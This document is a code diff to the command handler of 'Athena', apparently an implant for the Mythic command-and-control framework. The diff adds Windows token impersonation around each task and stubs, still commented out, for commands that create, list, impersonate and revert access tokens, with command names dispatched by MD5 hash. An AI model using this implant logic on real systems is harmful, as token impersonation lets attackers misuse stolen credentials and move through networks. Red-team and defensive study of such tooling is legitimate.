@@ -39,6 +39,9 @@ namespace Athena.Commands
         private DownloadHandler downloadHandler { get; set; }
         private ShellHandler shellHandler { get; set; }
         private UploadHandler uploadHandler { get; set; }
+#if WINBUILD
+        private TokenHandler tokenHandler { get; set; }
+#endif
         private ConcurrentBag<object> responseResults { get; set; }
         public CommandHandler()
         {
@@ -48,6 +51,11 @@ namespace Athena.Commands
             this.shellHandler = new ShellHandler();
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
+
+#if WINBUILD
+
+            this.tokenHandler = new TokenHandler();
+#endif
         }
         /// <summary>
         /// Initiate a task provided by the Mythic server
@@ -58,6 +66,9 @@ namespace Athena.Commands
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
 
+#if WINBUILD
+            this.tokenHandler.ThreadImpersonate();
+#endif
             switch (Misc.CreateMD5(job.task.command.ToLower())) //To lower "just in case"
             {
                 case "FD456406745D816A45CAE554C788E754": //download
@@ -144,8 +155,40 @@ namespace Athena.Commands
                     });
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "94A08DA1FECBB6E8B46990538C7B50B2":
-                    
+#if WINBUILD
+                //case "94A08DA1FECBB6E8B46990538C7B50B2": //token
+                //    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                //    string action = (string)tokenInfo["action"];
+
+                //    if (action == "create")
+                //    {
+                //        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
+                //    }
+                //    else if (action == "list")
+                //    {
+                //        this.responseResults.Add(await this.tokenHandler.ListTokens(job));
+                //    }
+                //    else if (action == "impersonate")
+                //    {
+                //        this.responseResults.Add(await this.tokenHandler.SetToken(job));
+                //    }
+                //    else if (action == "revert")
+                //    {
+                //        this.responseResults.Add(await this.tokenHandler.RevertToSelf(job));
+                //    }
+                //    else
+                //    {
+                //        this.responseResults.Add(new ResponseResult()
+                //        {
+                //            user_output = "Invalid action",
+                //            completed = "true",
+                //            task_id = job.task.id,
+                //            status = "error"
+                //        });
+                //    }
+                //    this.activeJobs.Remove(task.id, out _);
+                //    break;
+#endif
                 case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
@@ -164,6 +207,9 @@ namespace Athena.Commands
                     this.responseResults.Add(await CheckAndRunPlugin(job));
                     break;
             }
+#if WINBUILD
+            this.tokenHandler.ThreadRevert();
+#endif
         }
         /// <summary>
         /// EventHandler to begin exit
